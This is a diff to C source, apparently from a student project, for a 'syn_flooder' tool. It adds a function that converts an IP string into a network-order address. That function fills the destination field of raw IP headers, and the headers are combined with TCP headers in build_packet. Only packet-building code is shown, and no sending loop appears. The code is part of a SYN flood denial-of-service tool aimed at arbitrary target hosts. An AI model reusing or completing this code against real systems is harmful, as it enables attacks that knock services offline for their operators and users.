@@ -5,7 +5,7 @@
 ** Login   <janel@epitech.net>
 **
 ** Started on  Mon May 29 16:18:58 2017 Janel
-** Last update Tue Sep 19 15:21:57 2017 
+** Last update Wed Sep 20 19:36:41 2017 
 */
 
 # define _DEFAULT_SOURCE
@@ -17,6 +17,21 @@
 #include <netinet/if_ether.h>
 #include "syn_flooder.h"
 #include "debug.h"
+
+static __be32	char_to___be32(const char *ip_address)
+{
+    __be32	nbr;
+    char	*ptr;
+
+    nbr = 0;
+    ip_address = strtok((char *)ip_address, ".");
+    while (ip_address != NULL)
+      {
+        nbr = (nbr << 8) + strtoul(ip_address, &ptr, 0);
+        ip_address = strtok(NULL, ".");
+      }
+    return (htonl(nbr));
+}
 
 /*
 ** Only setting fields which are NOT 0.
@@ -35,9 +50,10 @@ static char		build_ip_header(unsigned char *packet,
   ip_header->protocol = IPPROTO_TCP;
   ip_header->id = htons(RANDOM_NBR_RANGE(0, 0xFFFF));
   ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-  /* NOT REQUIRED TO SET SOURCE ADDRESS */
-  if (inet_aton(target_ip_address, (struct in_addr[1]){{ip_header->daddr}}) != 1)
-    return (PRINT_ERROR("inet_pton:"), FALSE);
+  ip_header->daddr = char_to___be32(target_ip_address);
+  /* below sets field to 0 :| */
+  /* if (inet_aton(target_ip_address, (struct in_addr[1]){{ip_header->daddr}}) != 1) */
+  /* return (PRINT_ERROR("inet_pton:"), FALSE); */
   return (TRUE);
 }
 
@@ -56,12 +72,9 @@ static char	build_tcp_header(unsigned char *packet, const int port)
   return (TRUE);
 }
 
-/*
-** no inline		| DELETE ?
-*/
-__inline__ char		build_packet(unsigned char *packet,
-				     const char *target_ip_address,
-				     const int port)
+char		build_packet(unsigned char *packet,
+			     const char *target_ip_address,
+			     const int port)
 {
   return (build_ip_header(packet, target_ip_address)
 	  && build_tcp_header(packet, port));
